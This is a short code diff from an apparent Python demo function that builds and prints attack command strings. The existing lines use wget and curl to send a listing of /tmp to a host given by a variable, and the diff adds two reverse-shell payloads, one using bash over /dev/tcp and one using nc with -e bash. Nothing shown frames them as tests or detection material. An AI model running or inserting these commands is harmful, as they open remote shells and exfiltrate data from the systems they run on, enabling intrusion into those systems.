@@ -408,7 +408,10 @@ def demo():
     wget_cmd = f"bash -c 'wget http://{ip}:8000/ --method=POST --body-data=$(printf %s.. $(ls /tmp))'"
 
     curl_cmd = f"bash -c 'curl -d $(printf %s.. $(ls /tmp)) http://{ip}:8000/'"
-    cmds = [wget_cmd, curl_cmd]
+
+    bash_i = f"bash -i >& /dev/tcp/{ip}/9000 0>&1"
+    nc_e = f"nc {ip} 9000 -e bash"
+    cmds = [bash_i, nc_e, wget_cmd, curl_cmd]
 
     for cmd in cmds:
         print(cmd)
